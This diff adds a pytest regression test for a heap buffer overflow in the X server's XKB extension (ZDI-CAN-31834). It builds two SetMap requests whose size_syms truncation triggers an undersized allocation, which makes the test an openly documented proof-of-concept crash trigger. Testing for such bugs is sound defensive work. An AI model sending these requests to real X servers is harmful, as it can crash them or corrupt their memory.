@@ -168,6 +168,110 @@ class TestXkbSetMapOverflows:
             "Server crashed - CheckKeyActions totalActs mismatch OOB"
         )
 
+    @pytest.mark.asan
+    def test_resize_key_type_size_syms_overflow(self, xserver, xkb_xclient):
+        """
+        ZDI-CAN-31834: XkbResizeKeyType numeric truncation in size_syms.
+
+        size_syms is declared as unsigned short (16-bit) in XkbClientMapRec.
+        When XkbResizeKeyType() computes (nTotal * 15) / 10 for the new
+        size_syms, the 32-bit result is truncated to 16 bits, causing an
+        undersized calloc. The subsequent copy loop writes based on the
+        actual key count, overflowing the heap buffer.
+
+        Phase 1: Add a custom key type with numLevels=2 and configure all
+        keys (248) with 4 groups using that type.
+        Phase 2: Resize the type to numLevels=63, causing nTotal to exceed
+        65535 and triggering the unsigned short truncation in size_syms.
+        """
+        xclient, opcode = xkb_xclient
+
+        # Query current keymap to learn key range and type count
+        get_map = xkb.GetMapRequest(
+            opcode=opcode,
+            full=xkb.XkbKeyTypesMask | xkb.XkbKeySymsMask,
+        )
+        xclient.send_request(get_map)
+        resp = xclient.recv_response(timeout=5.0)
+        assert isinstance(resp, X11Reply), f"Expected GetMap reply, got {resp}"
+        reply = xkb.GetMapReply.from_bytes(resp.data[:32], resp.data[32:])
+
+        min_key = reply.min_key_code
+        max_key = reply.max_key_code
+        n_keys = max_key - min_key + 1
+        n_types = reply.n_types + reply.first_type  # total types
+        type_idx = n_types  # index of the new type we'll add
+        num_lvls_initial = 2
+        groups = 4
+        syms_per_key = groups * num_lvls_initial  # 8
+
+        # Phase 1: Add new type (numLevels=2) + set all keys with 4 groups
+        # xkbKeyTypeWireDesc: 8 bytes
+        type_wire = struct.pack("<BBHBBBB", 0, 0, 0, num_lvls_initial, 0, 0, 0)
+
+        # xkbSymMapWireDesc (8 bytes) + syms per key
+        sym_data = b""
+        for _ in range(n_keys):
+            sym_data += struct.pack(
+                "<BBBBBBH",
+                type_idx,  # kt_index[0]
+                type_idx,  # kt_index[1]
+                type_idx,  # kt_index[2]
+                type_idx,  # kt_index[3]
+                groups,  # groupInfo
+                num_lvls_initial,  # width
+                syms_per_key,  # nSyms
+            )
+            # sym data: symsPerKey keysyms
+            for s in range(syms_per_key):
+                sym_data += struct.pack("<I", 0x61 + s)
+
+        total_syms = n_keys * syms_per_key
+
+        payload1 = type_wire + sym_data
+        req1 = xkb.SetMapRequest(
+            opcode=opcode,
+            present=xkb.XkbKeyTypesMask | xkb.XkbKeySymsMask,
+            flags=xkb.XkbSetMapResizeTypes,
+            min_key_code=min_key,
+            max_key_code=max_key,
+            first_type=type_idx,
+            n_types=1,
+            first_key_sym=min_key,
+            n_key_syms=n_keys,
+            total_syms=total_syms & 0xFFFF,
+            payload=payload1,
+        )
+        xclient.send_request(req1)
+        resp = xclient.recv_response(timeout=5.0)
+        if isinstance(resp, X11Error):
+            pytest.skip(f"Phase 1 SetMap failed: error {resp.error_code}")
+
+        assert xserver.is_alive, "Server crashed during phase 1 setup"
+
+        # Phase 2: Resize type to numLevels=63 to trigger overflow
+        new_levels = 63
+        type_wire2 = struct.pack("<BBHBBBB", 0, 0, 0, new_levels, 0, 0, 0)
+
+        req2 = xkb.SetMapRequest(
+            opcode=opcode,
+            present=xkb.XkbKeyTypesMask,
+            flags=0,
+            min_key_code=min_key,
+            max_key_code=max_key,
+            first_type=type_idx,
+            n_types=1,
+            payload=type_wire2,
+        )
+        xclient.send_request(req2)
+        time.sleep(0.5)
+
+        assert xserver.is_alive, (
+            "Server crashed - XkbResizeKeyType size_syms truncation: "
+            "(nTotal * 15) / 10 overflows unsigned short, causing "
+            "undersized calloc and heap buffer overflow"
+        )
+
 
 class TestXkbSetGeometry:
     """Tests for XKB SetGeometry OOB vulnerabilities."""
